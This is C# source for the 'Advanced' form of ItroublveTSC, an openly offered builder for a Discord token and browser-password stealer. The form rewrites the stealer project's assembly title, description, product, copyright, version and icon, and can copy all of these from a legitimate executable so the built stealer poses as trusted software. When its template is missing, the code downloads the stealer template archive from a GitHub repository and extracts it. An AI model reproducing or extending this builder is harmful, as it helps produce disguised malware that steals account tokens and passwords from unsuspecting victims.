using DiscordFlooder.Class.Design.Rainbow;
using ItroublveTSC2;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace ItroublveTSC
{
    public partial class Advanced : Form
    {
        public static bool ICON { get; set; }
        #region GUI
        public Advanced()
        {
            InitializeComponent();
            RainbowTimer.Start();
        }

        private void CloseBtn_Click(object sender, EventArgs e)
        {
            if (File.Exists("TokenStealerCOPY.bin"))
            {
                File.Delete("TokenStealerCOPY.bin");
            }
            if (Directory.Exists(Path.GetTempPath() + "bin_copy"))
            {
                Directory.Delete(Path.GetTempPath() + "bin_copy", true);
            }
            File.Delete(Path.GetTempPath() + "convertedicon.ico");
            Environment.Exit(0);
        }

        private void button5_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void HeadServerLbl_MouseDown(object sender, MouseEventArgs e)
        {
            Mouse.x = MousePosition.X - Location.X;
            Mouse.y = MousePosition.Y - Location.Y;
        }

        private void HeadServerLbl_MouseMove(object sender, MouseEventArgs e)
        {
            bool flag = e.Button == MouseButtons.Left;
            if (flag)
            {
                Mouse.newpoint = MousePosition;
                Mouse.newpoint.X = Mouse.newpoint.X - Mouse.x;
                Mouse.newpoint.Y = Mouse.newpoint.Y - Mouse.y;
                Location = Mouse.newpoint;
            }
        }

        private void HeadLinePnlInf_MouseDown(object sender, MouseEventArgs e)
        {
            Mouse.x = MousePosition.X - Location.X;
            Mouse.y = MousePosition.Y - Location.Y;
        }

        private void HeadLinePnlInf_MouseMove(object sender, MouseEventArgs e)
        {
            bool flag = e.Button == MouseButtons.Left;
            if (flag)
            {
                Mouse.newpoint = MousePosition;
                Mouse.newpoint.X = Mouse.newpoint.X - Mouse.x;
                Mouse.newpoint.Y = Mouse.newpoint.Y - Mouse.y;
                Location = Mouse.newpoint;
            }
        }

        private void RainbowTimer_Tick(object sender, EventArgs e)
        {
            Rainbow.RainbowEffect();
            pnlRainbowTop.BackColor = Color.FromArgb(Rainbow.A, Rainbow.R, Rainbow.G);
            PnlRainbowDown.BackColor = Color.FromArgb(Rainbow.A, Rainbow.R, Rainbow.G);
            pictureBox1.BackColor = Color.FromArgb(Rainbow.A, Rainbow.R, Rainbow.G);
        }

        private void MsgBoxBtn_Click(object sender, EventArgs e)
        {
            var msgbox = Application.OpenForms.OfType<frm2>().FirstOrDefault();
            if (msgbox == null)
            {
                msgbox = new frm2();
            }
            msgbox.Show();
        }
        private void HomeBtn_Click(object sender, EventArgs e)
        {
            var frmMain2 = Application.OpenForms.OfType<frmMain>().FirstOrDefault();
            if (frmMain2 == null)
            {
                frmMain2 = new frmMain();
            }
            frmMain2.Location = this.Location;
            frmMain2.StartPosition = FormStartPosition.Manual;
            frmMain2.Show();
            Hide();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            var filesize = Application.OpenForms.OfType<FileSize>().FirstOrDefault();
            if (filesize == null)
            {
                filesize = new FileSize();
            }
            filesize.Show();
            Hide();
        }
        private void button6_Click(object sender, EventArgs e)
        {
            var credits = Application.OpenForms.OfType<Credits>().FirstOrDefault();
            if (credits == null)
            {
                credits = new Credits();
            }
            credits.Location = Location;
            credits.StartPosition = FormStartPosition.Manual;
            credits.Show();
            Hide();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            var filestealer = Application.OpenForms.OfType<FileStealer>().FirstOrDefault();
            if (filestealer == null)
            {
                filestealer = new FileStealer();
            }
            filestealer.Location = Location;
            filestealer.StartPosition = FormStartPosition.Manual;
            filestealer.Show();
            Hide();
        }
        private void Advanced_Load(object sender, EventArgs e)
        {
            ICON = false;
        }
        #endregion
        #region File Version == ONLY ACCEPT NUMBS ZONE
        private void AssemblyFileVTxt_KeyPress(object sender, KeyPressEventArgs e)
        {
            char ch = e.KeyChar;

            if (!char.IsDigit(ch) && ch != 8 && ch != 46 && ch != 131072)
            {
                e.Handled = true;
            }
        }
        private void AssemblyFileVTxt_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Control & e.KeyCode == Keys.A)
                AssemblyFileVTxt.SelectAll();
        }
        #endregion
        #region Placeholder
        private void AssemblyTitleTxt_Enter(object sender, EventArgs e)
        {
            if (AssemblyTitleTxt.Text == "Assembly Title Here")
            {
                AssemblyTitleTxt.Text = "";
            }
        }
        private void AssemblyTitleTxt_TextChanged(object sender, EventArgs e)
        {
            if (AssemblyTitleTxt.Text.Contains(@"\") || AssemblyTitleTxt.Text.Contains(@"/") || AssemblyTitleTxt.Text.Contains(@":") || AssemblyTitleTxt.Text.Contains(@"*") || AssemblyTitleTxt.Text.Contains(@"?") || AssemblyTitleTxt.Text.Contains($"<") || AssemblyTitleTxt.Text.Contains(@">") || AssemblyTitleTxt.Text.Contains(@"|"))
            {
                MessageBox.Show("INVALID CHARACTHERS", "ItroublveTSC", MessageBoxButtons.OK, MessageBoxIcon.Information);
                AssemblyTitleTxt.Text = null;
            }
        }
        private void AssemblyTitleTxt_Leave(object sender, EventArgs e)
        {
            if (AssemblyTitleTxt.Text == "")
            {
                AssemblyTitleTxt.Text = "Assembly Title Here";
            }
        }

        private void AssemblyDescTxt_Enter(object sender, EventArgs e)
        {
            if (AssemblyDescTxt.Text == "Assembly Description Here")
            {
                AssemblyDescTxt.Text = "";
            }
        }

        private void AssemblyDescTxt_Leave(object sender, EventArgs e)
        {
            if (AssemblyDescTxt.Text == "")
            {
                AssemblyDescTxt.Text = "Assembly Description Here";
            }
        }

        private void AssemblyProdTxt_Enter(object sender, EventArgs e)
        {
            if (AssemblyProdTxt.Text == "Assembly Product Here")
            {
                AssemblyProdTxt.Text = "";
            }
        }

        private void AssemblyProdTxt_Leave(object sender, EventArgs e)
        {
            if (AssemblyProdTxt.Text == "")
            {
                AssemblyProdTxt.Text = "Assembly Product Here";
            }
        }

        private void AssemblyCopyrTxt_Enter(object sender, EventArgs e)
        {
            if (AssemblyCopyrTxt.Text == "Assembly © Copyright")
            {
                AssemblyCopyrTxt.Text = "";
            }
        }

        private void AssemblyCopyrTxt_Leave(object sender, EventArgs e)
        {
            if (AssemblyCopyrTxt.Text == "")
            {
                AssemblyCopyrTxt.Text = "Assembly © Copyright";
            }
        }

        private void AssemblyFileVTxt_Enter(object sender, EventArgs e)
        {
            if (AssemblyFileVTxt.Text == "File Version")
            {
                AssemblyFileVTxt.Text = "";
            }
        }

        private void AssemblyFileVTxt_Leave(object sender, EventArgs e)
        {
            if (AssemblyFileVTxt.Text == "")
            {
                AssemblyFileVTxt.Text = "File Version";
            }
        }
        #endregion
        #region Icon
        private void CstmIcon_Click(object sender, EventArgs e)
        {
            string Temp = Path.GetTempPath();
            if (!File.Exists(Temp + "\\bin_copy\\Program.cs"))
            {
                try
                {
                    string test = ".\\bin";
                    string test2 = Temp + "bin_copy";
                    frmMain.Copy(test, test2);
                }
                catch (Exception ex)
                { 
                    MessageBox.Show(ex.Message, "ItroublveTSC");
                }
            }
            var fileContent = string.Empty;
            var filePath = string.Empty;
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.InitialDirectory = ".\\";
                openFileDialog.Filter = "ICO file (*.ico)|*.ico|PNG file (*.png)|*.png";
                openFileDialog.DefaultExt = "ICO file (*.ico)|*.ico";
                openFileDialog.FilterIndex = 2;
                openFileDialog.RestoreDirectory = true;
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    try
                    {

                        string text = File.ReadAllText(Temp + @"bin_copy/TOKEN STEALER CREATOR.csproj");
                        filePath = openFileDialog.FileName;
                        var fileStream = openFileDialog.OpenFile();
                        using (StreamReader reader = new StreamReader(fileStream))
                        {
                            fileContent = reader.ReadToEnd();
                        }
                        if (Path2Ico.Text != "")
                        {
                            text = text.Replace(Path2Ico.Text, "YourICON");
                            File.WriteAllText(Temp + @"bin_copy/TOKEN STEALER CREATOR.csproj", text);
                        }
                        if (filePath.EndsWith(".ico"))
                        {
                            text = text.Replace("YourICON", filePath);
                            File.WriteAllText(Temp + @"bin_copy/TOKEN STEALER CREATOR.csproj", text);
                            Path2Ico.Text = filePath;
                            IconPrePic.Image = new Bitmap(filePath);
                            ICON = true;
                        }
                        else if (filePath.EndsWith(".png"))
                        {
                            try
                            {
                                string _IconPlace = Path.GetTempFileName();
                                png.ConvertToIcon(new Bitmap(filePath), _IconPlace);
                                Path2Ico.Text = _IconPlace;
                                text = text.Replace("<!--", "");
                                text = text.Replace("-->", "");
                                text = text.Replace("YourICON", Path2Ico.Text);
                                File.WriteAllText(Temp + @"bin_copy/TOKEN STEALER CREATOR.csproj", text);
                                IconPrePic.Image = new Bitmap(filePath);
                                ICON = true;
                            }
                            catch (Exception ex)
                            {
                                if (!Directory.Exists(Application.StartupPath + "\\bin"))
                                {
                                    Directory.Delete(Path.GetTempPath() + "bin_copy", true);
                                    DialogResult dialogResult = MessageBox.Show("bin folder or files inside missing or modified!\r\n" + "Want to download bin files from Github?", "ItroublveTSC", MessageBoxButtons.YesNo);
                                    if (dialogResult == DialogResult.Yes)
                                    {
                                        string _cdDir = Path.GetDirectoryName(Application.ExecutablePath);
                                        DirectoryInfo di = Directory.CreateDirectory(_cdDir);
                                        using (WebClient webClient = new WebClient())
                                            webClient.DownloadFile("https://raw.githubusercontent.com/Itroublve/Token-Browser-Password-Stealer-Creator/6.0/AVOID%20ME/bin.zip", "Token Stealer Creator.zip");
                                        ZipFile.ExtractToDirectory(_cdDir + "\\Token Stealer Creator.zip", _cdDir);
                                        File.Delete(_cdDir + "\\Token Stealer Creator.zip");
                                        MessageBox.Show("Successfully downloaded and installed\nYou can continue now!", "ItroublveTSC");
                                        return;
                                    }
                                    else if (dialogResult == DialogResult.No)
                                    {
                                        MessageBox.Show("OK. FINE THEN. DO WHATEVER YOU WANT . -.", "ItroublveTSC");
                                        return;
                                    }
                                }
                                else
                                    MessageBox.Show(ex.Message, "ItroublveTSC");
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show("An error occured, Please send a screenshot of this below to; Itroublve Hacker...\r\n" +
                            (ex), "ItroublveTSC");
                    }
                }
            }
        }
        #endregion
        #region Assembly Info
        public void compilechng()
        {
            string Temp = Path.GetTempPath();
            bool flag2 = AssemblyTitleTxt.Text == "" || AssemblyTitleTxt.Text == "Assembly Title Here";
            bool flag3 = AssemblyDescTxt.Text == "" || AssemblyDescTxt.Text == "Assembly Description Here";
            bool flag4 = AssemblyProdTxt.Text == "" || AssemblyProdTxt.Text == "Assembly Product Here";
            bool flag5 = AssemblyCopyrTxt.Text == "" || AssemblyCopyrTxt.Text == "Assembly © Copyright";
            bool flag6 = AssemblyFileVTxt.Text == "" || AssemblyFileVTxt.Text == "File Version";
            {
                try
                {
                    string path = Temp + @"bin_copy";
                    if (!Directory.Exists(path))
                    {
                        string test = @"bin";
                        string test2 = Temp + @"bin_copy";
                        frmMain.Copy(test, test2);
                    }
                    string text3 = File.ReadAllText(Temp + @"bin_copy/TOKEN STEALER CREATOR.csproj");
                    string text2 = File.ReadAllText(Temp + @"bin_copy/Properties/AssemblyInfo.cs");
                    string text = File.ReadAllText(Temp + "bin_copy/Program.cs");
                    if (flag2)
                    {
                        text2 = text2.Replace("titel", "");
                    }
                    else
                    {
                        text3 = text3.Replace("Obfuscated Name", AssemblyTitleTxt.Text);
                        text2 = text2.Replace("titel", AssemblyTitleTxt.Text);
                    }
                    if (flag3)
                    {
                        text2 = text2.Replace("deskription", "");
                    }
                    else
                    {
                        text2 = text2.Replace("deskription", AssemblyDescTxt.Text);
                    }
                    if (flag4)
                    {
                        text2 = text2.Replace("produkt", "");
                    }
                    else
                    {
                        text2 = text2.Replace("produkt", AssemblyProdTxt.Text);
                    }
                    if (flag5)
                    {
                        text2 = text2.Replace("rightcopy", "");
                    }
                    else
                    {
                        text2 = text2.Replace("rightcopy", AssemblyCopyrTxt.Text);
                    }
                    if (!flag6)
                    {
                        text2 = text2.Replace("1.0.0.0", AssemblyFileVTxt.Text);
                    }
                    if (Path2Ico.Text != "")
                    {
                        text3 = text3.Replace("<!--", "");
                        text3 = text3.Replace("-->", "");
                        text3 = text3.Replace("YourICON", Path2Ico.Text);
                    }
                    File.WriteAllText(Temp + "bin_copy/Properties/AssemblyInfo.cs", text2);
                    File.WriteAllText(Temp + "bin_copy/TOKEN STEALER CREATOR.csproj", text3);
                    File.WriteAllText(Temp + "bin_copy/Program.cs", text);
                }
                catch (Exception ex)
                {
                    if (!Directory.Exists(Application.StartupPath + "\\bin"))
                    {
                        Directory.Delete(Path.GetTempPath() + "bin_copy", true);
                        DialogResult dialogResult = MessageBox.Show("bin folder or files inside missing or modified!\r\n" + "Want to download bin files from Github?", "ItroublveTSC", MessageBoxButtons.YesNo);
                        if (dialogResult == DialogResult.Yes)
                        {
                            string _cdDir = Path.GetDirectoryName(Application.ExecutablePath);
                            DirectoryInfo di = Directory.CreateDirectory(_cdDir);
                            using (WebClient webClient = new WebClient())
                                webClient.DownloadFile("https://raw.githubusercontent.com/Itroublve/Token-Browser-Password-Stealer-Creator/6.0/AVOID%20ME/bin.zip", "Token Stealer Creator.zip");
                            ZipFile.ExtractToDirectory(_cdDir + "\\Token Stealer Creator.zip", _cdDir);
                            File.Delete(_cdDir + "\\Token Stealer Creator.zip");
                            MessageBox.Show("Successfully downloaded and installed\nYou can continue now!", "ItroublveTSC");
                            return;
                        }
                        else if (dialogResult == DialogResult.No)
                        {
                            MessageBox.Show("OK. FINE THEN. DO WHATEVER YOU WANT . -.", "ItroublveTSC");
                            return;
                        }
                    }
                    else
                        MessageBox.Show(ex.Message, "ItroublveTSC");
                }
            }
        }
        private void ExeCopy_assembly_Click(object sender, EventArgs e)
        {
            string path = Path.GetTempPath() + @"bin_copy";
            if (!Directory.Exists(path))
            {
                string test = @"bin";
                string test2 = Path.GetTempPath() + @"bin_copy";
                frmMain.Copy(test, test2);
            }
            OpenFileDialog file = new OpenFileDialog();
            file.Filter = "EXE File (*.exe) | *.exe";
            if (file.ShowDialog() == DialogResult.OK)
            {
                FileVersionInfo gay = FileVersionInfo.GetVersionInfo(file.FileName);
                string cri = gay.OriginalFilename;
                if (cri != null)
                    cri = cri.Replace(".exe", null);
                AssemblyTitleTxt.Text = cri;
                AssemblyDescTxt.Text = gay.FileDescription;
                AssemblyProdTxt.Text = gay.ProductName;
                AssemblyCopyrTxt.Text = gay.LegalCopyright;
                AssemblyFileVTxt.Text = gay.FileVersion;
                if (MessageBox.Show("Do you want to get ICON of EXE as well?\nNote, the ICON will be trash quality...", "ItroublveTSC", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
                {
                    string Temp = Path.GetTempPath();
                    string text = File.ReadAllText(Temp + "bin_copy/TOKEN STEALER CREATOR.csproj");
                    if (Path2Ico.Text != "")
                    {
                        text = text.Replace(Path2Ico.Text, "YourICON");
                        File.WriteAllText(Temp + "bin_copy/TOKEN STEALER CREATOR.csproj", text);
                    }
                    Icon icon = Icon.ExtractAssociatedIcon(file.FileName);
                    if (File.Exists(Path.GetTempPath() + "convertedico.ico")) File.Delete(Path.GetTempPath() + "convertedico.ico");
                    using (var stream = new FileStream(Path.GetTempPath() + "convertedico.ico", FileMode.CreateNew))
                    {
                        icon.Save(stream);
                        stream.Close();
                        stream.Dispose();
                    }
                    icon.Dispose();
                    IconPrePic.Image = new Bitmap(Path.GetTempPath() + "convertedico.ico");
                    text = text.Replace("<!--", "");
                    text = text.Replace("-->", "");
                    text = text.Replace("YourICON", Path.GetTempPath() + "convertedico.ico");
                    File.WriteAllText(Path.GetTempPath() + "bin_copy/TOKEN STEALER CREATOR.csproj", text);
                    Path2Ico.Text = Path.GetTempPath() + "convertedico.ico";
                    ICON = true;
                }
            }
        }
        #endregion
    }
}
